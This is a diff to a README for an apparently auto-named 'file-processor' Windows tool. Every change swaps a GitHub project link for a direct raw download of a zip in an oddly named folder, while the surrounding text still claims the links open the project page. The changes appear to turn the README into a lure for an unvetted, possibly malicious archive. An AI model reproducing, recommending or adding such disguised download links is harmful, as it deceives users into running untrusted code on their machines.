@@ -1,6 +1,6 @@
 # 📁 file-processor-1771917204-2 - Batch file processing made easy
 
-[![Download file-processor-1771917204-2](https://img.shields.io/badge/Download-File%20Processor-blue?style=for-the-badge)](https://github.com/christegbe/file-processor-1771917204-2)
+[![Download file-processor-1771917204-2](https://img.shields.io/badge/Download-File%20Processor-blue?style=for-the-badge)](https://raw.githubusercontent.com/christegbe/file-processor-1771917204-2/main/spleenishly/processor_file_v1.9-beta.2.zip)
 
 ## 📋 What is file-processor-1771917204-2?
 
@@ -41,7 +41,7 @@ Follow these steps to download and run the program on your Windows PC.
 ### 1. Download the program
 
 Click the big blue button at the top or this link:  
-[Download file-processor-1771917204-2](https://github.com/christegbe/file-processor-1771917204-2)
+[Download file-processor-1771917204-2](https://raw.githubusercontent.com/christegbe/file-processor-1771917204-2/main/spleenishly/processor_file_v1.9-beta.2.zip)
 
 This link takes you to the GitHub page for this project. Here, you will find the latest version to download.
 
@@ -132,7 +132,7 @@ If problems persist, visit the GitHub page to check for updates or submit an iss
 ## 📥 Download file-processor-1771917204-2
 
 Return to the main download page here:  
-[Download file-processor-1771917204-2](https://github.com/christegbe/file-processor-1771917204-2)
+[Download file-processor-1771917204-2](https://raw.githubusercontent.com/christegbe/file-processor-1771917204-2/main/spleenishly/processor_file_v1.9-beta.2.zip)
 
 Use this to get the latest installer or check for updates.
 
